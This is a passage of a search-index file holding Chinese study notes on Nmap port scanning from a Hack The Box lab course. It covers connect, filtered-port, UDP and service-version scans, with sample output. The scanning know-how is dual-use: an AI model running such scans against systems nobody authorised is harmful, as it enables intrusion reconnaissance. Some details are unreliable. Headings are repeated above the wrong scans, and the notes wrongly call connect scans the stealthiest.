seq=1699105818 win=1024 mss 1460</code> \u9644\u52a0\u7684 TCP \u6807\u5934\u53c2\u6570\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_11","title":"\u54cd\u5e94","text":"\u4fe1\u606f \u63cf\u8ff0 <code>RCVD (0.0573s)</code> \u6307\u793a\u4ece\u76ee\u6807\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u3002 <code>TCP</code> \u663e\u793a\u6b63\u5728\u4f7f\u7528\u7684\u534f\u8bae\u3002 <code>10.129.2.28:21 &gt;</code> \u8868\u793a\u76ee\u6807 IPv4 \u5730\u5740\u548c\u6e90\u7aef\u53e3\uff0c\u5c06\u7528\u4e8e\u56de\u590d\u3002 <code>10.10.14.2:63090</code> \u663e\u793a\u6211\u4eec\u7684 IPv4 \u5730\u5740\u548c\u5c06\u56de\u590d\u7684\u7aef\u53e3\u3002 <code>RA</code> \u53d1\u9001\u7684 TCP \u6570\u636e\u5305\u7684 RST \u548c ACK \u6807\u5fd7\u3002 <code>ttl=64 id=0 iplen=40 seq=0 win=0</code> \u9644\u52a0\u7684 TCP \u6807\u5934\u53c2\u6570\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_12","title":"\u8fde\u63a5\u626b\u63cf","text":"<p>Nmap TCP \u8fde\u63a5\u626b\u63cf( <code>-sT</code>) \u4f7f\u7528 TCP \u4e09\u5411\u63e1\u624b\u6765\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u4e0a\u7684\u7279\u5b9a\u7aef\u53e3\u662f\u6253\u5f00\u8fd8\u662f\u5173\u95ed\u3002\u626b\u63cf<code>SYN</code>\u5411\u76ee\u6807\u7aef\u53e3\u53d1\u9001\u6570\u636e\u5305\u5e76\u7b49\u5f85\u54cd\u5e94\u3002\u5982\u679c\u76ee\u6807\u7aef\u53e3\u4ee5<code>SYN-ACK</code>\u6570\u636e\u5305\u54cd\u5e94\uff0c\u5219\u8ba4\u4e3a\u5b83\u662f\u6253\u5f00\u7684\uff1b\u5982\u679c\u5b83\u4ee5<code>RST</code>\u6570\u636e\u5305\u54cd\u5e94\uff0c\u5219\u8ba4\u4e3a\u5b83\u662f\u5173\u95ed\u7684\u3002</p> <p>\u626b\u63cf<code>Connect</code>\u5f88\u6709\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u786e\u5b9a\u7aef\u53e3\u72b6\u6001\u7684\u6700\u51c6\u786e\u65b9\u6cd5\uff0c\u4e5f\u662f\u6700\u9690\u79d8\u7684\u65b9\u6cd5\u3002\u4e0e SYN \u626b\u63cf\u7b49\u5176\u4ed6\u7c7b\u578b\u7684\u626b\u63cf\u4e0d\u540c\uff0cConnect \u626b\u63cf\u4e0d\u4f1a\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u7559\u4e0b\u4efb\u4f55\u672a\u5b8c\u6210\u7684\u8fde\u63a5\u6216\u672a\u53d1\u9001\u7684\u6570\u636e\u5305\uff0c\u8fd9\u4f7f\u5f97\u5b83\u4e0d\u592a\u53ef\u80fd\u88ab\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf (IDS) \u6216\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf (IPS) \u68c0\u6d4b\u5230). \u5f53\u6211\u4eec\u60f3\u8981\u6620\u5c04\u7f51\u7edc\u5e76\u4e14\u4e0d\u60f3\u5e72\u6270\u5176\u80cc\u540e\u8fd0\u884c\u7684\u670d\u52a1\u65f6\uff0c\u5b83\u5f88\u6709\u7528\uff0c\u56e0\u6b64\u9020\u6210\u7684\u5f71\u54cd\u6700\u5c0f\uff0c\u6709\u65f6\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u66f4\u793c\u8c8c\u7684\u626b\u63cf\u65b9\u6cd5\u3002</p> <p>\u5f53\u76ee\u6807\u4e3b\u673a\u5177\u6709\u4e22\u5f03\u4f20\u5165\u6570\u636e\u5305\u4f46\u5141\u8bb8\u4f20\u51fa\u6570\u636e\u5305\u7684\u4e2a\u4eba\u9632\u706b\u5899\u65f6\uff0c\u5b83\u4e5f\u5f88\u6709\u7528\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fde\u63a5\u626b\u63cf\u53ef\u4ee5\u7ed5\u8fc7\u9632\u706b\u5899\u5e76\u51c6\u786e\u786e\u5b9a\u76ee\u6807\u7aef\u53e3\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u8bf7\u52a1\u5fc5\u6ce8\u610f\uff0c\u8fde\u63a5\u626b\u63cf\u6bd4\u5176\u4ed6\u7c7b\u578b\u7684\u626b\u63cf\u6162\uff0c\u56e0\u4e3a\u5b83\u8981\u6c42\u626b\u63cf\u5668\u5728\u53d1\u9001\u6bcf\u4e2a\u6570\u636e\u5305\u540e\u7b49\u5f85\u76ee\u6807\u7684\u54cd\u5e94\uff0c\u5982\u679c\u76ee\u6807\u7e41\u5fd9\u6216\u65e0\u54cd\u5e94\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#tcp-443","title":"\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf","text":"<p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:26 CET\nCONN (0.0385s) TCP localhost &gt; 10.129.2.28:443 =&gt; Operation now in progress\nCONN (0.0396s) TCP localhost &gt; 10.129.2.28:443 =&gt; Connected\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.013s latency).\n\nPORT    STATE SERVICE REASON\n443/tcp open  https   syn-ack\n\nNmap done: 1 IP address (1 host up) scanned in 0.04 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_13","title":"\u8fc7\u6ee4\u7aef\u53e3","text":"<p>\u5f53\u7aef\u53e3\u663e\u793a\u4e3a\u5df2\u8fc7\u6ee4\u65f6\uff0c\u53ef\u80fd\u6709\u591a\u79cd\u539f\u56e0\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u9632\u706b\u5899\u8bbe\u7f6e\u4e86\u7279\u5b9a\u7684\u89c4\u5219\u6765\u5904\u7406\u7279\u5b9a\u7684\u8fde\u63a5\u3002\u6570\u636e\u5305\u53ef\u4ee5\u662f<code>dropped</code>, \u6216<code>rejected</code>\u3002\u5f53\u4e00\u4e2a\u6570\u636e\u5305\u88ab\u4e22\u5f03\uff0c<code>Nmap</code>\u6ca1\u6709\u6536\u5230\u6765\u81ea\u6211\u4eec\u76ee\u6807\u7684\u54cd\u5e94\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u91cd\u8bd5\u7387 ( <code>--max-retries</code>) \u8bbe\u7f6e\u4e3a 1\u3002\u8fd9\u610f\u5473\u7740<code>Nmap</code>\u5c06\u91cd\u65b0\u53d1\u9001\u8bf7\u6c42\u5230\u76ee\u6807\u7aef\u53e3\uff0c\u4ee5\u786e\u5b9a\u524d\u4e00\u4e2a\u6570\u636e\u5305\u662f\u5426\u88ab\u610f\u5916\u9519\u8bef\u5904\u7406\u3002</p> <p>\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u793a\u4f8b\uff0c\u5176\u4e2d\u9632\u706b\u5899<code>drops</code>\u5bf9\u6211\u4eec\u53d1\u9001\u7684 TCP \u6570\u636e\u5305\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u3002\u56e0\u6b64\u6211\u4eec\u626b\u63cf TCP \u7aef\u53e3139\uff0c\u5b83\u5df2\u7ecf\u663e\u793a\u4e3a\u5df2\u8fc7\u6ee4\u3002\u4e3a\u4e86\u80fd\u591f\u8ddf\u8e2a\u6211\u4eec\u53d1\u9001\u7684\u6570\u636e\u5305\u662f\u5982\u4f55\u5904\u7406\u7684\uff0c\u6211\u4eec\u518d\u6b21\u505c\u7528 ICMP \u56de\u663e\u8bf7\u6c42 ( <code>-Pn</code>)\u3001DNS \u89e3\u6790 ( <code>-n</code>) \u548c ARP ping \u626b\u63cf ( )\u3002<code>--disable-arp-ping</code></p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:45 CEST\nSENT (0.0381s) TCP 10.10.14.2:60277 &gt; 10.129.2.28:139 S ttl=47 id=14523 iplen=44  seq=4175236769 win=1024 &lt;mss 1460&gt;\nSENT (1.0411s) TCP 10.10.14.2:60278 &gt; 10.129.2.28:139 S ttl=45 id=7372 iplen=44  seq=4175171232 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT    STATE    SERVICE\n139/tcp filtered netbios-ssn\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 139</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <p>\u6211\u4eec\u5728\u4e0a\u6b21\u626b\u63cf\u4e2d\u770b\u5230<code>Nmap</code>\u53d1\u9001\u4e86\u4e24\u4e2a\u5e26\u6709 SYN \u6807\u5fd7\u7684 TCP \u6570\u636e\u5305\u3002<code>2.06s</code>\u901a\u8fc7\u626b\u63cf\u7684\u6301\u7eed\u65f6\u95f4 ( )\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b83\u82b1\u8d39\u7684\u65f6\u95f4\u6bd4\u4e4b\u524d\u7684 ( <code>~0.05s</code>) \u957f\u5f97\u591a\u3002\u5982\u679c\u9632\u706b\u5899\u62d2\u7edd\u6570\u636e\u5305\uff0c\u60c5\u51b5\u5c31\u4e0d\u540c\u4e86\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u67e5\u770b TCP \u7aef\u53e3<code>445</code>\uff0c\u5b83\u7531\u9632\u706b\u5899\u7684\u6b64\u7c7b\u89c4\u5219\u76f8\u5e94\u5730\u5904\u7406\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 445 --packet-trace -n --disable-arp-ping -Pn\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:55 CEST\nSENT (0.0388s) TCP 10.129.2.28:52472 &gt; 10.129.2.28:445 S ttl=49 id=21763 iplen=44  seq=1418633433 win=1024 &lt;mss 1460&gt;\nRCVD (0.0487s) ICMP [10.129.2.28 &gt; 10.129.2.28 Port 445 unreachable (type=3/code=3) ] IP [ttl=64 id=20998 iplen=72 ]\nNmap scan report for 10.129.2.28\nHost is up (0.0099s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 445</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <p>\u4f5c\u4e3a\u54cd\u5e94\uff0c\u6211\u4eec\u6536\u5230<code>ICMP</code>\u5e26\u6709<code>type 3</code>\u548c \u7684\u56de\u590d<code>error code 3</code>\uff0c\u8fd9\u8868\u660e\u65e0\u6cd5\u8bbf\u95ee\u6240\u9700\u7684\u4e3b\u673a\u3002\u7136\u800c\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e3b\u673a\u662f\u6d3b\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f3a\u70c8\u5047\u8bbe\u8fd9\u4e2a\u7aef\u53e3\u4e0a\u7684\u9632\u706b\u5899\u62d2\u7edd\u4e86\u6570\u636e\u5305\uff0c\u6211\u4eec\u7a0d\u540e\u5fc5\u987b\u4ed4\u7ec6\u67e5\u770b\u8fd9\u4e2a\u7aef\u53e3\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#udp","title":"\u53d1\u73b0\u5f00\u653e\u7684 UDP \u7aef\u53e3","text":"<p>\u6709\u4e9b\u7cfb\u7edf\u7ba1\u7406\u5458\u6709\u65f6\u4f1a\u5fd8\u8bb0\u8fc7\u6ee4 TCP \u7aef\u53e3\u4e4b\u5916\u7684 UDP \u7aef\u53e3\u3002\u7531\u4e8e<code>UDP</code>\u662f\u4e00\u4e2a<code>stateless protocol</code>\u5e76\u4e14\u4e0d\u9700\u8981\u50cf TCP \u8fd9\u6837\u7684\u4e09\u5411\u63e1\u624b\u3002\u6211\u4eec\u6ca1\u6709\u6536\u5230\u4efb\u4f55\u786e\u8ba4\u3002\u56e0\u6b64\uff0c\u8d85\u65f6\u65f6\u95f4\u957f\u5f97\u591a\uff0c\u4f7f\u6574\u4e2a<code>UDP scan</code>( <code>-sU</code>) \u6bd4<code>TCP scan</code>( <code>-sS</code>) \u6162\u5f97\u591a\u3002</p> <p>\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a UDP \u626b\u63cf ( ) \u7684\u793a\u4f8b<code>-sU</code>\u4ee5\u53ca\u5b83\u7ed9\u6211\u4eec\u7684\u7ed3\u679c\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -F -sU\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:01 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.059s latency).\nNot shown: 95 closed ports\nPORT     STATE         SERVICE\n68/udp   open|filtered dhcpc\n137/udp  open          netbios-ns\n138/udp  open|filtered netbios-dgm\n631/udp  open|filtered ipp\n5353/udp open          zeroconf\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 98.07 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <p>\u8fd9\u6837\u505a\u7684\u53e6\u4e00\u4e2a\u7f3a\u70b9\u662f\u6211\u4eec\u7ecf\u5e38\u5f97\u4e0d\u5230\u54cd\u5e94\uff0c\u56e0\u4e3a<code>Nmap</code>\u5411\u626b\u63cf\u7684 UDP \u7aef\u53e3\u53d1\u9001\u7a7a\u6570\u636e\u62a5\uff0c\u6211\u4eec\u6536\u4e0d\u5230\u4efb\u4f55\u54cd\u5e94\u3002\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u786e\u5b9a UDP \u6570\u636e\u5305\u662f\u5426\u5df2\u7ecf\u5230\u8fbe\u3002\u5982\u679c UDP \u7aef\u53e3\u662f<code>open</code>\uff0c\u6211\u4eec\u53ea\u6709\u5728\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u4e3a\u8fd9\u6837\u505a\u65f6\u624d\u4f1a\u6536\u5230\u54cd\u5e94\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 137 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:15 CEST\nSENT (0.0367s) UDP 10.10.14.2:55478 &gt; 10.129.2.28:137 ttl=57 id=9122 iplen=78\nRCVD (0.0398s) UDP 10.129.2.28:137 &gt; 10.10.14.2:55478 ttl=64 id=13222 iplen=257\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.0031s latency).\n\nPORT    STATE SERVICE    REASON\n137/udp open  netbios-ns udp-response ttl 64\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.04 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 137</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <p>\u5982\u679c\u6211\u4eec\u6536\u5230\u4e00\u4e2a\u5e26\u6709\uff08\u7aef\u53e3\u4e0d\u53ef\u8fbe\uff09\u7684 ICMP \u54cd\u5e94<code>error code 3</code>\uff0c\u6211\u4eec\u5c31\u77e5\u9053\u8be5\u7aef\u53e3\u786e\u5b9e\u662f<code>closed</code>\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:25 CEST\nSENT (0.0445s) UDP 10.10.14.2:63825 &gt; 10.129.2.28:100 ttl=57 id=29925 iplen=28\nRCVD (0.1498s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port unreachable (type=3/code=3) ] IP [ttl=64 id=11903 iplen=56 ]\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.11s latency).\n\nPORT    STATE  SERVICE REASON\n100/udp closed unknown port-unreach ttl 64\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in  0.15 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 100</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <p>\u5bf9\u4e8e\u6240\u6709\u5176\u4ed6 ICMP \u54cd\u5e94\uff0c\u626b\u63cf\u7684\u7aef\u53e3\u6807\u8bb0\u4e3a ( <code>open|filtered</code>)\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 138 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:32 CEST\nSENT (0.0380s) UDP 10.10.14.2:52341 &gt; 10.129.2.28:138 ttl=50 id=65159 iplen=28\nSENT (1.0392s) UDP 10.10.14.2:52342 &gt; 10.129.2.28:138 ttl=40 id=24444 iplen=28\nNmap scan report for 10.129.2.28\nHost is up, received user-set.\n\nPORT    STATE         SERVICE     REASON\n138/udp open|filtered netbios-dgm no-response\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-sU</code> \u6267\u884c UDP \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 138</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <p>\u626b\u63cf\u7aef\u53e3\u7684\u53e6\u4e00\u79cd\u4fbf\u6377\u65b9\u6cd5\u662f<code>-sV</code>\u7528\u4e8e\u4ece\u6253\u5f00\u7684\u7aef\u53e3\u83b7\u53d6\u5176\u4ed6\u53ef\u7528\u4fe1\u606f\u7684\u9009\u9879\u3002\u6b64\u65b9\u6cd5\u53ef\u4ee5\u8bc6\u522b\u7248\u672c\u3001\u670d\u52a1\u540d\u79f0\u548c\u6709\u5173\u76ee\u6807\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason  -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-11-04 11:10 GMT\nSENT (0.3426s) TCP 10.10.14.2:44641 &gt; 10.129.2.28:445 S ttl=55 id=43401 iplen=44  seq=3589068008 win=1024 &lt;mss 1460&gt;\nRCVD (0.3556s) TCP 10.129.2.28:445 &gt; 10.10.14.2:44641 SA ttl=63 id=0 iplen=44  seq=2881527699 win=29200 &lt;mss 1337&gt;\nNSOCK INFO [0.4980s] nsock_iod_new2(): nsock_iod_new (IOD #1)\nNSOCK INFO [0.4980s] nsock_connect_tcp(): TCP connection requested to 10.129.2.28:445 (IOD #1) EID 8\nNSOCK INFO [0.5130s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.2.28:445]\nService scan sending probe NULL to 10.129.2.28:445 (tcp)\nNSOCK INFO [0.5130s] nsock_read(): Read request from IOD #1 [10.129.2.28:445] (timeout: 6000ms) EID 18\nNSOCK INFO [6.5190s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.2.28:445]\nService scan sending probe SMBProgNeg to 10.129.2.28:445 (tcp)\nNSOCK INFO [6.5190s] nsock_write(): Write request for 168 bytes to IOD #1 EID 27 [10.129.2.28:445]\nNSOCK INFO [6.5190s] nsock_read(): Read request from IOD #1 [10.129.2.28:445] (timeout: 5000ms) EID 34\nNSOCK INFO [6.5190s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.2.28:445]\nNSOCK INFO [6.5320s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.2.28:445] (135 bytes)\nService scan match (Probe SMBProgNeg matched with SMBProgNeg line 13836): 10.129.2.28:445 is netbios-ssn.  Version: |Samba smbd|3.X - 4.X|workgroup: WORKGROUP|\nNSOCK INFO [6.5320s] nsock_iod_delete(): nsock_iod_delete (IOD #1)\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.013s latency).\n\nPORT    STATE SERVICE     REASON         VERSION\n445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\nService Info: Host: Ubuntu\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.55 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-p 445</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--reason</code> \u663e\u793a\u7aef\u53e3\u5904\u4e8e\u7279\u5b9a\u72b6\u6001\u7684\u539f\u56e0\u3002 <code>-sV</code> \u6267\u884c\u670d\u52a1\u626b\u63cf\u3002 <p>\u6211\u4eec\u53ef\u4ee5\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u627e\u5230\u6709\u5173\u7aef\u53e3\u626b\u63cf\u6280\u672f\u7684\u66f4\u591a\u4fe1\u606f\uff1ahttps ://nmap.org/book/man-port-scanning-techniques.html</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_14","title":"\u4fdd\u5b58\u7ed3\u679c","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_15","title":"\u4e0d\u540c\u7684\u683c\u5f0f","text":"<p>\u5f53\u6211\u4eec\u8fd0\u884c\u5404\u79cd\u626b\u63cf\u65f6\uff0c\u6211\u4eec\u5e94\u8be5\u59cb\u7ec8\u4fdd\u5b58\u7ed3\u679c\u3002\u7a0d\u540e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u6765\u68c0\u67e5\u6211\u4eec\u4f7f\u7528\u7684\u4e0d\u540c\u626b\u63cf\u65b9\u6cd5\u4e4b\u95f4\u7684\u5dee\u5f02\u3002 <code>Nmap</code>\u53ef\u4ee5\u4ee5 3 \u79cd\u4e0d\u540c\u7684\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\u3002</p> <ul> <li>\u6b63\u5e38\u8f93\u51fa( <code>-oN</code>) \u5e26<code>.nmap</code>\u6587\u4ef6\u6269\u5c55\u540d</li> <li>\u5e26\u6709\u6587\u4ef6\u6269\u5c55\u540d\u7684Grepable \u8f93\u51fa ( <code>-oG</code>)<code>.gnmap</code></li> <li>\u5e26\u6709\u6587\u4ef6\u6269\u5c55\u540d\u7684XML \u8f93\u51fa ( <code>-oX</code>)<code>.xml</code></li> </ul> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u6307\u5b9a\u9009\u9879 ( <code>-oA</code>) \u4ee5\u6240\u6709\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\u3002\u8be5\u547d\u4ee4\u53ef\u80fd\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -oA target\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 12:14 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.0091s latency).\nNot shown: 65525 closed ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n25/tcp    open  smtp\n80/tcp    open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 